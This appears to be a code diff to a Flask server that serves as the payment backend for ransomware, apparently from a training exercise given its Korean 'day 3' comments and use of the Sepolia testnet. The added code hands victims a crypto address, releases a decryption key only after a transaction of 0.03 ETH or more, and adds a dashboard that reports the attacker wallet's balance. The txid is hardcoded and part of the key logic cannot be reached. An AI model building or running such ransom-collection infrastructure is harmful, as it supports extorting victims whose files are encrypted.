@@ -4,6 +4,8 @@ from Database import Database
 import random
 import time
 import os
+from web3 import Web3
+
 app = Flask(__name__)
 
 db = Database("./db/db.json")
@@ -50,13 +52,10 @@ def save_token():
     })
     return {
         "token" : token,
-        "etheremum_address" : "0x1edfsfefwefsfesfsfae3rfewewrfed"
+        "etheremum_address" : "0x16D72BC0Aba6eB906fF99651A96F920Cb331aD72",
+        "status" : "success"
     }
 
-# 현황을 보여주는 페이지
-@app.route("/dashboard")
-def dashboard():
-    pass
 
 # 현재 상황을 보여주는 페이지 (악성코드 별)
 # /information?token={token}
@@ -110,10 +109,44 @@ def get_key():
         data :dict = db.get( token )
     else :
         return "invalid token"
+    infura_url = 'https://rpc.sepolia.org'
+    web3 = Web3(Web3.HTTPProvider(infura_url))
+
+    # txid = request.args.get("txid")
+    txid = "0x19c6e51b1e1c505b47aa52712109331543c6c7e4a1d4af1158d83ce7d9ddac7d"
+    transaction = web3.eth.get_transaction(txid)
+    if transaction is None : 
+        return "invalid txid"
+    if db.get("txid") :
+        return " already used"
+    
+    # 4. 0.03 ETH 이상 보냈으면, 키 반환
+    if float(Web3.from_wei(transaction['value'], "ether")) < 0.03 :
+        return "invalid"
+    
+    return float(Web3.from_wei(transaction['value'], "ether")).__str__()
     
     if data["key"] == None :
         return "null"
     return data["key"] if data["is_paid"] == True else "you must have paid for decryption key"
+
+
+# 3 일차
+@app.route("/dashboard")
+def dashboard() :
+    balance = 0
+    # 이더리음 네트워크에서 해커의 balance 를 가져오세요
+    infura_url = 'https://rpc.sepolia.org'
+    web3 = Web3(Web3.HTTPProvider(infura_url))# 잔액을 확인하고자 하는 계좌 주소를 설정합니다.
+
+
+    account = '0x6Dbc2677e6fB596e7EBdfb256e7A4156d4816c75'# 계좌의 잔액을 조회합니다.
+
+    balance = web3.eth.get_balance(account)# Wei 단위의 잔액을 Ether로 변환하여 출력합니다.
+
+    return {
+        "Balance" : float(web3.from_wei(balance, "ether"))
+    }
 
 if __name__ == '__main__':
     app.run(debug=True)
